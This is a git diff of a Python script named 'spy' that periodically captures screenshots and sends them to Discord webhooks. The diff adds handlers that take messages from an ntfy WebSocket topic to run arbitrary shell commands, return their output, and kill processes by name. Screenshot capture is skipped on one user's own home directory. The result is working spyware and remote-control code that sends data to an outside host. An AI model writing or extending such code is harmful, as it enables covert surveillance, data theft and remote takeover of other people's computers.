@@ -1,42 +1,43 @@
 #!/usr/bin/env python
 
 import time, os
-from datetime import datetime
+from datetime import datetime,timedelta
 from mss import mss
 from discord_webhook import DiscordWebhook, DiscordEmbed
 from dotenv import load_dotenv
 import signal
 import time
 import sys
-
 import signal
 import hashlib
 import sys
-
-# required if you want to upload screenshots on google drive
-from google.oauth2.service_account import Credentials
-from googleapiclient.discovery import build
-from googleapiclient.errors import HttpError
-from googleapiclient.http import MediaFileUpload
-
 import json
 import asyncio
 import websockets
 from plyer import notification
 import psutil
 import humanize
-import datetime as dt
+import subprocess
+# required if you want to upload screenshots on google drive
+from google.oauth2.service_account import Credentials
+from googleapiclient.discovery import build
+from googleapiclient.errors import HttpError
+from googleapiclient.http import MediaFileUpload
+
+
 
 load_dotenv('/usr/local/src/spy/.env')
 NUCLEAR_CODE = os.getenv('NUCLEAR_CODE')
 
 userhome = os.path.expanduser('~')
-URL = os.getenv('DISCORD_WEBHOOK_URL')
+SS_URL = os.getenv('DISCORD_SS_URL')
+LOG_URL = os.getenv('DISCORD_LOG_URL')
+
 
 def send_msg_on_discord(msg, is_file=False):
     
-    content = f'{userhome} - {datetime.now()}' if is_file else f'{userhome} - {msg}'
-    webhook = DiscordWebhook(url=URL, content=content, rate_limit_retry=True)
+    content = f'{userhome} - {datetime.now()}' if is_file else msg
+    webhook = DiscordWebhook(url=SS_URL if is_file else LOG_URL, content=content, rate_limit_retry=True)
     if is_file:
         webhook.add_file(file=open(msg, 'rb').read(), filename=msg)
     response = webhook.execute()
@@ -105,6 +106,21 @@ def handle_signal(signal_number, frame):
     except Exception as e:
         print(e)
 
+def kill_process_by_name(name):
+    # Iterate over all running processes
+    for proc in psutil.process_iter(['pid', 'name']):
+        try:
+            # If the process name matches, terminate it
+            if proc.info['name'].lower() == name.lower():
+                print(f"Killing process: {proc.info['name']} with PID: {proc.info['pid']}")
+                proc.terminate()  # Terminate the process
+                proc.wait()  # Wait for the process to terminate
+                send_msg_on_discord(f"Process {proc.info['name']} (PID {proc.info['pid']}) terminated.")
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+            # Ignore processes that no longer exist or are inaccessible
+            continue
+
+
 # Function to handle receiving messages from the WebSocket
 async def subscribe_to_topic():
     # Define the ntfy server and topic
@@ -122,10 +138,24 @@ async def subscribe_to_topic():
             while True:
                 try:
                     response = json.loads(await websocket.recv())  # Wait for a message
-                    msg = response['message']
+                    msg = response.get('message')
+                    if not msg:
+                        continue
                     print(f"New message: {msg}")
-                    if msg == 'status':
-                        send_msg_on_discord(humanize.precisedelta(dt.timedelta(seconds=time.time() - psutil.boot_time())))
+                    if msg.startswith('cmd'):
+                        # Use subprocess.run to capture the output
+                        command = msg.split(' ')[1:]
+                        result = subprocess.run(command, capture_output=True, text=True, shell=False)
+                        # Access the standard output (stdout) from the result
+                        output = result.stdout[:1950]
+                        print(output)
+                        send_msg_on_discord(f'```{output}```')
+                    elif msg == 'uptime':
+                        t = 'uptime: ' + humanize.precisedelta(timedelta(seconds=time.time() - psutil.boot_time()))
+                        send_msg_on_discord(t)
+                    elif msg.startswith('kill'):              
+                        for p in msg.split(' ')[1:]:
+                            kill_process_by_name(p)
                     else:
                          # Display the message as a system notification
                         notification.notify(
@@ -135,6 +165,7 @@ async def subscribe_to_topic():
                             timeout=10
                         )
                 except Exception as e:
+                    send_msg_on_discord(e)
                     print(e)
 
     except Exception as e:
@@ -142,6 +173,8 @@ async def subscribe_to_topic():
 
 
 async def take_screenshot_periodically():
+    if 'talha' in userhome:
+        return
     while True:
         try:
             print(datetime.now(), 'Taking screenshot...')
